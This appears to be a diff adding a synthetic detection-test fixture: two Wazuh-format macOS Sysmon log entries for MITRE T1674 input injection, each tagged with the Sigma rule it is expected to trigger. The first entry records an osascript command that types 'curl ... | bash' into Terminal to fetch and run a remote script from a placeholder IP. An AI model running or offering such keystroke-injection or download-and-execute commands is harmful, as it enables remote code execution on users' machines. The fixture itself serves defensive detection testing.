@@ -1,0 +1,140 @@
+{
+  "_metadata": {
+    "attack_id": "T1674",
+    "variation": "002",
+    "name": "Input Injection - osascript keystroke",
+    "description": "Adversary uses osascript to inject keystrokes on macOS",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "macOS Sysmon Event 1 - osascript keystroke injection",
+      "sequence": 1,
+      "timestamp": "2026-02-08T16:45:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:45:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon for macOS - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1674"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Input Injection"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "macos"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.100"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300078",
+        "decoder": {
+          "name": "sysmon-macos"
+        },
+        "location": "/var/log/sysmon.log",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 16:45:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1674-0002-000000000001}",
+            "processId": "48234",
+            "image": "/usr/bin/osascript",
+            "commandLine": "osascript -e 'tell application \"Terminal\" to activate' -e 'tell application \"System Events\" to keystroke \"curl http://198.51.100.110/p.sh | bash\" & return'",
+            "currentDirectory": "/Users/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1674-0002-PARENT000001}",
+            "parentProcessId": "48200",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1674",
+        "_fomorian_expected_detection": "Sigma: Osascript Keystroke Injection (T1674)"
+      }
+    },
+    {
+      "_comment": "macOS Sysmon Event 1 - osascript key code injection",
+      "sequence": 2,
+      "timestamp": "2026-02-08T16:46:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:46:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for macOS - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1674"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Input Injection"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "macos"
+          ]
+        },
+        "agent": {
+          "id": "002",
+          "name": "ANALYST01",
+          "ip": "198.51.100.100"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300079",
+        "decoder": {
+          "name": "sysmon-macos"
+        },
+        "location": "/var/log/sysmon.log",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 16:46:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1674-0002-000000000002}",
+            "processId": "48345",
+            "image": "/usr/bin/osascript",
+            "commandLine": "osascript -e 'tell application \"System Events\" to key code 53 using {command down, shift down}'",
+            "currentDirectory": "/Users/attacker",
+            "user": "attacker",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1674-0002-PARENT000002}",
+            "parentProcessId": "48200",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1674",
+        "_fomorian_expected_detection": "Sigma: Osascript Key Code Injection (T1674)"
+      }
+    }
+  ]
+}
